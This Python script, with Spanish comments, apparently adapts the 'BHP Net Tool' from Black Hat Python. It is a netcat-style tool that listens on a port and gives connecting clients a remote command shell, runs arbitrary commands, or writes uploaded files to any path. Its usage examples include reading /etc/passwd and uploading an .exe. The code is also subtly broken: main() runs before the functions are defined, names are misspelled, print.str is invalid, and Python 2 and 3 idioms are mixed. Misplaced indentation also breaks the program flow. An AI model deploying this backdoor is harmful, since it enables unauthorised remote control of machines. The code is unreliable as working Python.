import sys
import socket
import getopt
import threading
import subprocess

# Definimos las variables globales
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0
def usage():
    print ("BHP Net Tool")
    #print
    print ("Usage: bhpnet.py -t target_host -p port")
    print ("-l --listen - listen on [host]:[port] for incoming connections")
    print ("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print ("-c --command - initialize a command shell")
    print ("-u --upload=destination - upon receiving connection upload a file and write to [destination]")
    #print
    #print
    print ("Examples: ")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print ("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    if not len(sys.argv[1:]):
        usage()
    # leer las opciones de línea de comando
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
        ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print.str(err)
        usage()
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"
    if not listen and len(target) and port > 0:
        # leer en el búfer desde la línea de comando
        # esto bloqueará, así que envíe CTRL-D si no envía la entrada
        # Entrada estándar
        buffer = sys.stdin.read()
        # Enviamos datos
        client_sender(buffer)
        # Nosotros vamos a escuchar y potencialmente
        # cargue cosas, ejecute comandos y devuelva un shell
        # dependiendo de nuestras opciones de línea de comandos anteriores
    if listen:
        server_lopp()
main()
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # A conectarse a su host de destino
        client.connect((target,port))
        if len(buffer):
            client.send(buffer)
        while True:
            # Ahora espera a que te devuelvan los datos
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response+= data
                if recv_len < 4096:
                    break
                print (response),
                # Esperar más entrada
                buffer = raw_input("")
                buffer += "\n"
                # Enviamos
                client.send(buffer)
    except:
        print("[*] Exception! Exiting.")
        # Romper la conexión
        client.close()
def server_loop():
    global target
    # si no se define ningún objetivo, escuchamos en todas las interfaces
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        # Esconder un hilo para manejar a nuestro nuevo cliente
        client_thread = threading.Thread(target=client_handler,
        args=(client_socket,))
        client_thread.start()
def run_command(command):
    # Recortamos la nueva linea
    command = command.rstrip()
    # Ejecutamos el comando y recupere la salida
    try:
        output = subprocess.check_output(command,stderr=subprocess.
    STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
        # Enviar la salida de nuevo al cliente
    return output
def client_handler(client_socket):
    global upload
    global execute
    global command
    # Verificamos la carga
    if len(upload_destination):
        # Leemos todos los bytes y escribir en nuestro destino
        file_buffer = ""
        # Seguimos leyendo datos hasta que no haya ninguno disponible
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        # Ahora tomamos estos bytes e intentamos escribirlos
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            # Reconocer que escribimos el archivo
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
            # Comprobar la ejecución del comando
        if len(execute):
            # Ejecutamos el comando
            output = run_command(execute)
            client_socket.send(output)
        # Ahora entramos en otro bucle si se solicitó un shell de comando
        if command:
            while True:
                # mostrar un aviso simple
                client_socket.send("<BHP:#> ")
                    # Ahora lo recibimos hasta que veamos un salto de línea.
                cmd_buffer = ""
                while "\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)
                # Enviar de vuelta la salida del comando
                response = run_command(cmd_buffer)
                # Enviar de vuelta la respuesta
                client_socket.send(response)

